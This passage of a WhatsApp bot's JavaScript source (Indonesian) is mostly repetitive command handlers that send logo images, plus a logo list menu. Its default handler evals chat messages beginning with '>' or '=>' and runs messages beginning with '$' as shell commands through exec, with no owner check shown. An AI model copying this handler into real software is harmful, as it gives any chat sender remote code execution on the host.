if (isBan) return reply(`Lah Lu Kan Di Ban`)
haikal.sendMessage(m.chat, { image: hw27,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw28': {
if (!isRegistered) return replyReg(mess.verif)
if (isBan) return reply(`Lah Lu Kan Di Ban`)
haikal.sendMessage(m.chat, { image: hw28,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw29': {
if (!isRegistered) return replyReg(mess.verif)
if (isBan) return reply(`Lah Lu Kan Di Ban`)
haikal.sendMessage(m.chat, { image: hw29,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw30': {
if (!isRegistered) return replyReg(mess.verif)
if (isBan) return reply(`Lah Lu Kan Di Ban`)
haikal.sendMessage(m.chat, { image: hw30,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw31': {
if (!isRegistered) return replyReg(mess.verif)
if (isBan) return reply(`Lah Lu Kan Di Ban`)
haikal.sendMessage(m.chat, { image: hw31,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw32': {
if (!isRegistered) return replyReg(mess.verif)
if (isBan) return reply(`Lah Lu Kan Di Ban`)
haikal.sendMessage(m.chat, { image: hw32,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw33': {
if (!isRegistered) return replyReg(mess.verif)
if (isBan) return reply(`Lah Lu Kan Di Ban`)
haikal.sendMessage(m.chat, { image: hw33,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw34': {
if (!isRegistered) return replyReg(mess.verif)
if (isBan) return reply(`Lah Lu Kan Di Ban`)
haikal.sendMessage(m.chat, { image: hw34,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw35': {
if (!isRegistered) return replyReg(mess.verif)
if (isBan) return reply(`Lah Lu Kan Di Ban`)
haikal.sendMessage(m.chat, { image: hw35,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw36': {
if (!isRegistered) return replyReg(mess.verif)
if (isBan) return reply(`Lah Lu Kan Di Ban`)
haikal.sendMessage(m.chat, { image: hw36,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw37': {
if (!isRegistered) return replyReg(mess.verif)
if (isBan) return reply(`Lah Lu Kan Di Ban`)
haikal.sendMessage(m.chat, { image: hw37,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw38': {
if (!isRegistered) return replyReg(mess.verif)
if (isBan) return reply(`Lah Lu Kan Di Ban`)
haikal.sendMessage(m.chat, { image: hw38,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw39': {
if (!isRegistered) return replyReg(mess.verif)
if (isBan) return reply(`Lah Lu Kan Di Ban`)
haikal.sendMessage(m.chat, { image: hw39,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw40': {
if (!isRegistered) return replyReg(mess.verif)
if (isBan) return reply(`Lah Lu Kan Di Ban`)
haikal.sendMessage(m.chat, { image: hw40,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw41': {
if (!isRegistered) return replyReg(mess.verif)
if (isBan) return reply(`Lah Lu Kan Di Ban`)
haikal.sendMessage(m.chat, { image: hw41,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw42': {
if (!isRegistered) return replyReg(mess.verif)
if (isBan) return reply(`Lah Lu Kan Di Ban`)
haikal.sendMessage(m.chat, { image: hw42,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw43': {
if (!isRegistered) return replyReg(mess.verif)
if (isBan) return reply(`Lah Lu Kan Di Ban`)
haikal.sendMessage(m.chat, { image: hw43,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw44': {
if (!isRegistered) return replyReg(mess.verif)
if (isBan) return reply(`Lah Lu Kan Di Ban`)
haikal.sendMessage(m.chat, { image: hw44,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw45': {
if (!isRegistered) return replyReg(mess.verif)
if (isBan) return reply(`Lah Lu Kan Di Ban`)
haikal.sendMessage(m.chat, { image: hw45,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw46': {
if (!isRegistered) return replyReg(mess.verif)
if (isBan) return reply(`Lah Lu Kan Di Ban`)
haikal.sendMessage(m.chat, { image: hw46,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw47': {
if (!isRegistered) return replyReg(mess.verif)
if (isBan) return reply(`Lah Lu Kan Di Ban`)
haikal.sendMessage(m.chat, { image: hw47,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw48': {
if (!isRegistered) return replyReg(mess.verif)
if (isBan) return reply(`Lah Lu Kan Di Ban`)
haikal.sendMessage(m.chat, { image: hw48,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw49': {
if (!isRegistered) return replyReg(mess.verif)
if (isBan) return reply(`Lah Lu Kan Di Ban`)
haikal.sendMessage(m.chat, { image: hw49,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw50': {
if (!isRegistered) return replyReg(mess.verif)
if (isBan) return reply(`Lah Lu Kan Di Ban`)
haikal.sendMessage(m.chat, { image: hw50,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw51': {
if (!isRegistered) return replyReg(mess.verif)
if (isBan) return reply(`Lah Lu Kan Di Ban`)
haikal.sendMessage(m.chat, { image: hw51,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw52': {
if (!isRegistered) return replyReg(mess.verif)
if (isBan) return reply(`Lah Lu Kan Di Ban`)
haikal.sendMessage(m.chat, { image: hw52,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw53': {
if (!isRegistered) return replyReg(mess.verif)
if (isBan) return reply(`Lah Lu Kan Di Ban`)
haikal.sendMessage(m.chat, { image: hw53,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw54': {
if (!isRegistered) return replyReg(mess.verif)
if (isBan) return reply(`Lah Lu Kan Di Ban`)
haikal.sendMessage(m.chat, { image: hw54,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw55': {
if (!isRegistered) return replyReg(mess.verif)
if (isBan) return reply(`Lah Lu Kan Di Ban`)
haikal.sendMessage(m.chat, { image: hw55,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw56': {
if (!isRegistered) return replyReg(mess.verif)
if (isBan) return reply(`Lah Lu Kan Di Ban`)
haikal.sendMessage(m.chat, { image: hw56,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw57': {
if (!isRegistered) return replyReg(mess.verif)
if (isBan) return reply(`Lah Lu Kan Di Ban`)
haikal.sendMessage(m.chat, { image: hw57,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw58': {
if (!isRegistered) return replyReg(mess.verif)
if (isBan) return reply(`Lah Lu Kan Di Ban`)
haikal.sendMessage(m.chat, { image: hw58,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw59': {
if (!isRegistered) return replyReg(mess.verif)
if (isBan) return reply(`Lah Lu Kan Di Ban`)
haikal.sendMessage(m.chat, { image: hw59,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw60': {
if (!isRegistered) return replyReg(mess.verif)
if (isBan) return reply(`Lah Lu Kan Di Ban`)
haikal.sendMessage(m.chat, { image: hw60,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw61': {
if (!isRegistered) return replyReg(mess.verif)
if (isBan) return reply(`Lah Lu Kan Di Ban`)
haikal.sendMessage(m.chat, { image: hw61,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw62': {
if (!isRegistered) return replyReg(mess.verif)
if (isBan) return reply(`Lah Lu Kan Di Ban`)
haikal.sendMessage(m.chat, { image: hw62,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw63': {
if (!isRegistered) return replyReg(mess.verif)
if (isBan) return reply(`Lah Lu Kan Di Ban`)
haikal.sendMessage(m.chat, { image: hw63,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw64': {
if (!isRegistered) return replyReg(mess.verif)
if (isBan) return reply(`Lah Lu Kan Di Ban`)
haikal.sendMessage(m.chat, { image: hw64,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw65': {
if (!isRegistered) return replyReg(mess.verif)
if (isBan) return reply(`Lah Lu Kan Di Ban`)
haikal.sendMessage(m.chat, { image: hw65,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw66': {
if (!isRegistered) return replyReg(mess.verif)
if (isBan) return reply(`Lah Lu Kan Di Ban`)
haikal.sendMessage(m.chat, { image: hw66,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw67': {
if (!isRegistered) return replyReg(mess.verif)
if (isBan) return reply(`Lah Lu Kan Di Ban`)
haikal.sendMessage(m.chat, { image: hw67,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw68': {
if (!isRegistered) return replyReg(mess.verif)
if (isBan) return reply(`Lah Lu Kan Di Ban`)
haikal.sendMessage(m.chat, { image: hw68,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw69': {
if (!isRegistered) return replyReg(mess.verif)
if (isBan) return reply(`Lah Lu Kan Di Ban`)
haikal.sendMessage(m.chat, { image: hw69,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw70': {
if (!isRegistered) return replyReg(mess.verif)
if (isBan) return reply(`Lah Lu Kan Di Ban`)
haikal.sendMessage(m.chat, { image: hw70,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw71': {
if (!isRegistered) return replyReg(mess.verif)
if (isBan) return reply(`Lah Lu Kan Di Ban`)
haikal.sendMessage(m.chat, { image: hw71,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw72': {
if (!isRegistered) return replyReg(mess.verif)
if (isBan) return reply(`Lah Lu Kan Di Ban`)
haikal.sendMessage(m.chat, { image: hw72,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw73': {
if (!isRegistered) return replyReg(mess.verif)
if (isBan) return reply(`Lah Lu Kan Di Ban`)
haikal.sendMessage(m.chat, { image: hw73,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw74': {
if (!isRegistered) return replyReg(mess.verif)
if (isBan) return reply(`Lah Lu Kan Di Ban`)
haikal.sendMessage(m.chat, { image: hw74,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw75': {
if (!isRegistered) return replyReg(mess.verif)
if (isBan) return reply(`Lah Lu Kan Di Ban`)
haikal.sendMessage(m.chat, { image: hw75,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw76': {
if (!isRegistered) return replyReg(mess.verif)
if (isBan) return reply(`Lah Lu Kan Di Ban`)
haikal.sendMessage(m.chat, { image: hw76,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw77': {
if (!isRegistered) return replyReg(mess.verif)
if (isBan) return reply(`Lah Lu Kan Di Ban`)
haikal.sendMessage(m.chat, { image: hw77,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw78': {
if (!isRegistered) return replyReg(mess.verif)
if (isBan) return reply(`Lah Lu Kan Di Ban`)
haikal.sendMessage(m.chat, { image: hw78,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'hw79': {
if (!isRegistered) return replyReg(mess.verif)
if (isBan) return reply(`Lah Lu Kan Di Ban`)
haikal.sendMessage(m.chat, { image: hw79,  caption: `© Created By Hw Mods` }, { quoted:m })
}
break
case 'logo':
if (!isRegistered) return replyReg(mess.verif)
if (isBan) return reply(`Lah Lu Kan Di Ban`)
touchmebree = [
{
title: `©️ HW MODS WA`,
rows: [
{title: `LOGO 1`, rowId: `${prefix}hw1`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
{title: `LOGO 2`, rowId: `${prefix}hw2`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `LOGO 3`, rowId: `${prefix}hw3`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `LOGO 4`, rowId: `${prefix}hw4`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
 {title: `LOGO 5`, rowId: `${prefix}hw5`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `LOGO 6`, rowId: `${prefix}hw6`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
   {title: `LOGO 7`, rowId: `${prefix}hw7`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `LOGO 8`, rowId: `${prefix}hw8`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
 {title: `LOGO 9`, rowId: `${prefix}hw9`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `LOGO 10`, rowId: `${prefix}hw10`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
   {title: `LOGO 11`, rowId: `${prefix}hw11`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `LOGO 12`, rowId: `${prefix}hw12`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
 {title: `LOGO 13`, rowId: `${prefix}hw13`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `LOGO 14`, rowId: `${prefix}hw14`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `LOGO 15`, rowId: `${prefix}hw15`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `LOGO 16`, rowId: `${prefix}hw16`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
   {title: `LOGO 17`, rowId: `${prefix}hw17`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `LOGO 18`, rowId: `${prefix}hw18`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
 {title: `LOGO 19`, rowId: `${prefix}hw19`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
{title: `LOGO 20`, rowId: `${prefix}hw20`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
`},
{title: `LOGO 21`, rowId: `${prefix}hw21`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
{title: `LOGO 22`, rowId: `${prefix}hw22`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `LOGO 23`, rowId: `${prefix}hw23`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `LOGO 24`, rowId: `${prefix}hw24`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
 {title: `LOGO 25`, rowId: `${prefix}hw25`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `LOGO 26`, rowId: `${prefix}hw26`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
   {title: `LOGO 27`, rowId: `${prefix}hw27`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `LOGO 28`, rowId: `${prefix}hw28`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
 {title: `LOGO 29`, rowId: `${prefix}hw29`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `LOGO 30`, rowId: `${prefix}hw30`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
   {title: `LOGO 31`, rowId: `${prefix}hw31`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `LOGO 32`, rowId: `${prefix}hw32`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
 {title: `LOGO 33`, rowId: `${prefix}hw33`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `LOGO 34`, rowId: `${prefix}hw34`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `LOGO 35`, rowId: `${prefix}hw35`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `LOGO 36`, rowId: `${prefix}hw36`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
   {title: `LOGO 37`, rowId: `${prefix}hw37`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `LOGO 38`, rowId: `${prefix}hw38`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
 {title: `LOGO 39`, rowId: `${prefix}hw39`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
{title: `LOGO 40`, rowId: `${prefix}hw40`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
`},
{title: `LOGO 41`, rowId: `${prefix}hw41`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
{title: `LOGO 42`, rowId: `${prefix}hw42`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `LOGO 43`, rowId: `${prefix}hw43`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `LOGO 44`, rowId: `${prefix}hw44`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
 {title: `LOGO 45`, rowId: `${prefix}hw45`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `LOGO 46`, rowId: `${prefix}hw46`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
   {title: `LOGO 47`, rowId: `${prefix}hw47`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `LOGO 48`, rowId: `${prefix}hw48`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
 {title: `LOGO 49`, rowId: `${prefix}hw49`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `LOGO 50`, rowId: `${prefix}hw50`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
   {title: `LOGO 51`, rowId: `${prefix}hw51`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `LOGO 52`, rowId: `${prefix}hw52`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
 {title: `LOGO 53`, rowId: `${prefix}hw53`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `LOGO 54`, rowId: `${prefix}hw54`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `LOGO 55`, rowId: `${prefix}hw55`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `LOGO 56`, rowId: `${prefix}hw56`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
   {title: `LOGO 57`, rowId: `${prefix}hw57`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `LOGO 58`, rowId: `${prefix}hw58`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
 {title: `LOGO 59`, rowId: `${prefix}hw59`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
{title: `LOGO 60`, rowId: `${prefix}hw60`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
`},
{title: `LOGO 61`, rowId: `${prefix}hw61`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
{title: `LOGO 62`, rowId: `${prefix}hw62`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `LOGO 63`, rowId: `${prefix}hw63`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `LOGO 64`, rowId: `${prefix}hw64`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
 {title: `LOGO 65`, rowId: `${prefix}hw65`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `LOGO 66`, rowId: `${prefix}hw66`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
   {title: `LOGO 67`, rowId: `${prefix}hw67`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `LOGO 68`, rowId: `${prefix}hw68`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
 {title: `LOGO 69`, rowId: `${prefix}hw69`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `LOGO 70`, rowId: `${prefix}hw70`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
   {title: `LOGO 71`, rowId: `${prefix}hw71`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `LOGO 72`, rowId: `${prefix}hw72`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
 {title: `LOGO 73`, rowId: `${prefix}hw73`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `LOGO 74`, rowId: `${prefix}hw74`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `LOGO 75`, rowId: `${prefix}hw75`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `LOGO 76`, rowId: `${prefix}hw76`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
   {title: `LOGO 77`, rowId: `${prefix}hw77`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `LOGO 78`, rowId: `${prefix}hw78`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
 {title: `LOGO 79`, rowId: `${prefix}hw99`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `}
]
}
]
haikal.sendListMsg(m.chat, `
 Menyediakan Logo Gratis Untuk Kalian Mau
Total 79 Gambar Dalam 
79 Command, Dengan Logo Yang Berbeda 🤝


Semoga Kalian Suka 🥳`, haikal.user.name, `Hay Kak Logo Picture Ada Di List Yah`, `Click Here 🌷`, touchmebree, m)
break
//=================================================//
default:
if (budy.startsWith('=>')) {
function Return(sul) {
sat = JSON.stringify(sul, null, 2)
bang = util.format(sat)
if (sat == undefined) {
bang = util.format(sul)}
return m.reply(bang)}
try {
m.reply(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
} catch (e) {
m.reply(String(e))}}
if (budy.startsWith('>')) {
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await m.reply(evaled)
} catch (err) {
await m.reply(String(err))}}
if (budy.startsWith('$')) {
exec(budy.slice(2), (err, stdout) => {
if(err) return m.reply(err)
if (stdout) return m.reply(stdout)})}
//=================================================//
if (isCmd && budy.toLowerCase() != undefined) {
if (m.chat.endsWith('broadcast')) return
if (m.isBaileys) return
let msgs = global.db.database
if (!(budy.toLowerCase() in msgs)) return
haikal.copyNForward(m.chat, msgs[budy.toLowerCase()], true)}}
} catch (err) {
m.reply(util.format(err))}}
//=================================================//
let file = require.resolve(__filename)
fs.watchFile(file, () => {
fs.unwatchFile(file)
console.log(chalk.redBright(`Update ${__filename}`))
delete require.cache[file]
require(file)
})